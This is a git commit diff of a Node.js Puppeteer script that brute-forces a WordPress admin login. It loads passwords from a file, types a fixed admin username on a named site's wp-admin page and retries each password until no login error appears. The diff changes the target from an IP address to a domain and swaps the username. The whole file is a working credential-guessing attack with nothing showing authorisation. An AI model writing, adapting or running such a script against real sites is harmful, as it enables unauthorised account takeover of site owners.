0a6c4122cc9f72cf7b90cbbc86a5fcec45a95372
Nabila BENNACER <67286480+gabylim@users.noreply.github.com>
2021-11-28 19:56:48 +0100

    Update app.js

--- app.js
+++ app.js
@@ -1,35 +1,32 @@
 const puppeteer = require('puppeteer');
-const fs= require('fs');
-let mdp=fs.readFileSync("passwords.txt", "utf8");
-
-let i = 0;
+const fs = require('fs');
+let data = fs.readFileSync("passwords.txt", "utf8");
+data = data.replace(/(?:\r\n|\r|\n)/g, " ").split(" ");
+//const username = 'admin';
+let index = 0;
 
 (async () => {
-    let password_found=false;
-  await puppeteer.launch({ headless: false, defaultViewport: null, });
   const browser = await puppeteer.launch({
     headless: false,
     defaultViewport: null,
   });
-const page = await browser.newPage();
-await page.goto('http://52.47.83.211/wp-admin');
-await page.waitForSelector('input[id="user_login"]');
-await page.type('input[id="user_login"]', 'nabila_admin');
-//await page.type('input[id="user_pass"]', 'Nabila.06');
-//await page.click('input[id="wp-submit"]');
-await verif_mdp();
+  await puppeteer.launch({ headless: false, defaultViewport: null, });
+  const page = await browser.newPage();
+
+  await page.goto('http://agence.red-mouse.fr/wp-admin');
+  await page.type('input[id="user_login"]', 'admin-redmonkey');
+  await check_password(page);
 })();
 
-async function verif_mdp(page) {
-    await page.type('input[id="user_pass"]', 'Nabila.06');
-    await page.waitForSelector('#wp-submit');
-    await page.click('input[id="wp-submit"]');
 
-    err = await page.waitForSelector('#login_error');
-    if(err){
-        return await verif_mdp(page, mdp[i++]);
-    }
-    
+async function check_password (page) {
+  await page.type('#user_pass', data[index]);
+  await page.waitForSelector("#wp-submit");
+  await page.click("#wp-submit");
+
+  error = await page.waitForSelector("#login_error");
+  if (error) {
+    console.log(data[index])
+    return await check_password(page,data[index++]);
+  }
 }
-
-
